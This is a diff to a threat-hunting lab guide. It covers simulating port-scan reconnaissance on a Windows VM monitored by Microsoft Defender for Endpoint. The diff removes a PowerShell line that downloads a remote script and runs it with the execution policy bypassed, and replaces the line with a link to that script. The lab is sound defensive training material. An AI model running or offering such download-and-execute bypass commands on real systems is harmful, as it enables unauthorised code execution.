@@ -1,13 +1,12 @@
 # Threat Event (Sudden Network Slowdowns)
-**Lateral Reconnaissance and Port Scanning**
+**Lateral Reconnaissance via Port Scanning**
 
 ## Steps the "Bad Actor" took Create Logs and IoCs:
 1. Provision a Windows VM and confirm the VM is reachable externally (e.g., ping)
 2. Onboard the VM to Microsoft Defender for Endpoint (MDE)
-3. Run the following PowerShell command on the onboarded VM to simulate lateral reconnaissance and port scanning
- ```powershell
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1' -OutFile 'C:\programdata\portscan.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1
- ```
+3. Run the following PowerShell command on the onboarded VM to simulate lateral reconnaissance and port scanning:<br>
+    [Port Scan Simulation Script](https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1)
+
 ---
 
 ## Tables Used for IoC Identification:
